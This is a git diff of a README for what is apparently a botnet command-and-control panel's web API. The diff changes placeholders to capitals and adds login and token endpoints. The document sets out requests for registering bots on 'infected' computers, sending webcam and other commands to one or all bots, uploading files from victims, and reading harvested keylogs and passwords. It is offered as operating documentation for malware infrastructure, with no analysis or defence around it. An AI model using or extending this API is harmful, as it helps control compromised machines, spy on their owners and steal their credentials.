@@ -62,7 +62,7 @@
 > `bot_username`     This is the username of the bot on the infected computer.  
 > `bot_computername` This is the computername of the bot on the infected computer.  
 
-**GET REQUEST:** _httр://host/api.php?profile=username&token=token&bot_uuid=bot_uuid&bot_username=bot_username&bot_computername=bot_computername&create_user_
+**GET REQUEST:** _httр://host/api.php?profile=username&token=TOKEN&bot_uuid=BOT_UUID&bot_username=BOT_USERNAME&bot_computername=BOT_COMPUTERNAME&create_user_
 ```json
 {
    "status":"Success",
@@ -74,7 +74,7 @@
 ###### DELETE BOT:
 > Delete bot from database and folder.
 
-**GET REQUEST:** _httр://host/api.php?profile=username&token=token&bot_uuid=bot_uuid&rmbot_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&rmbot_
 ```json
 {
    "status":"Success",
@@ -84,7 +84,7 @@
 ```
 
 ###### CHECK BOT:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&check_user_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&check_user_
 ```json
 {
    "status":"Success",
@@ -95,7 +95,7 @@
 
 
 ###### SEND COMMAND TO BOT:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&command=webcam&arguments="arg1", "arg2", "...."_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&command=webcam&arguments="arg1", "arg2", "...."_
 ```json
 {
    "status":"Success",
@@ -105,7 +105,7 @@
 ```
 
 ###### SEND GLOBAL COMMAND TO ALL BOTS:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&global_command=webcam&arguments="arg1", "arg2", "...."_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&global_command=webcam&arguments="arg1", "arg2", "...."_
 ```json
 {
    "status":"Success",
@@ -115,7 +115,7 @@
 ```
 
 ###### CHECK FOR COMMANDS:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&commands_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&commands_
 ```json
 {
    "status":"Success",
@@ -138,7 +138,7 @@
 > `response` This is a data line. Which is stored on the server.  
 > `type`     May be 'local'. Data string will be stored on your bot.  
 
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&response=Here is response data to bot&type=local_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&response=Here is response data to bot&type=local_
 ```json
 {
    "status":"Success",
@@ -152,7 +152,7 @@
 > `response` This is a data line. Which is stored on the server.  
 > `type`     If 'global'. Data string will be stored on your account.  
 
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&response=Here is response data to bot&type=global_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&response=Here is response data to bot&type=global_
 ```json
 {
    "status":"Success",
@@ -164,7 +164,7 @@
 ###### GET LOCAL RESPONSE DATA FROM BOT:
 > Attention! After executing the request, the line will be deleted from the server!
 
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&type=local&get_response_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&type=local&get_response_
 ```json
 {
    "status":"Success",
@@ -177,7 +177,7 @@
 ###### GET GLOBAL RESPONSE DATA FROM ACCOUNT:
 > Attention! After executing the request, the line will be deleted from the server!
 
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&type=global&get_response_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&type=global&get_response_
 ```json
 {
    "status":"Success",
@@ -191,7 +191,7 @@
 >  Example python code to upload file: https://pastebin.com/0gteFain  
 >  File will be saved in folder: /users/`profile`/`bot_uuid`/file.txt  
  
-**POST REQUEST WITH FILE:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&upload_
+**POST REQUEST WITH FILE:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&upload_
 ```json
 {
    "status":"Success",
@@ -213,7 +213,7 @@
 ###### READ FILES FROM YOU DIRECTORY:
 > For example we read uploaded file by bot. In her directory.
 
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&read_file=bot_uuid/keylogs.txt_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&read_file=BOT_UUID/keylogs.txt_
 ```json
 {
    "status":"Success",
@@ -232,7 +232,7 @@
 ```
 
 ###### GET FILES LIST FROM BOT DIRECTORY:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&ls_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&ls_
 ```json
 {
    "status":"Success",
@@ -247,7 +247,7 @@
 ```
 
 ###### REMOVE FILE FROM BOT DIRECTORY:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&bot_uuid=bot_uuid&rm=file_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&bot_uuid=BOT_UUID&rm=file_
 ```json
 {
    "status":"Success",
@@ -257,7 +257,7 @@
 ```
 
 ###### GET FILE HASH(md5) FROM BOT DIRECTORY:
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&md5=users/profile/bot_uuid/passwords.txt_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&md5=users/profile/bot_uuid/passwords.txt_
 ```json
 {
    "status":"Success",
@@ -271,7 +271,7 @@
 ###### GET MY BOTS:
 > `login_password` It a password from account  
 
-**GET REQUEST:** _httр://host/api.php?profile=profile&token=token&login_password=password&get_my_users_
+**GET REQUEST:** _httр://host/api.php?profile=PROFILE&token=TOKEN&login_password=PASSWORD&get_my_users_
 ```json
 {
    "status":"Success",
@@ -293,5 +293,37 @@
          "last_time":"10:50 9.10.2019"
       }
    ]
+}
+```
+
+
+### Other commands
+###### LOGIN:
+> `login_username` It a username from account  
+> `login_password` It a password from account  
+>  
+> `status codes:`  
+>  1 - Logged in  
+>  2 - Wrong passwords  
+>  3 - User not found  
+
+**GET REQUEST:** _httр://host/scripts/database.php?login_username=USERNAME&login_password=PASSWORD&login_
+```json
+{
+   "message":"Logged in.",
+   "status":1
+}
+```
+
+###### GET TOKEN BY LOGIN AND PASSWORD:
+> `login_username` It a username from account  
+> `login_password` It a password from account  
+
+**GET REQUEST:** _httр://host/scripts/database.php?login_username=USERNAME&login_password=PASSWORD&getToken_
+```json
+{
+   "message":"Login and Password is correct. Token is here",
+   "token":"ACCOUNT-SECRET-TOKEN",
+   "value":true
 }
 ```
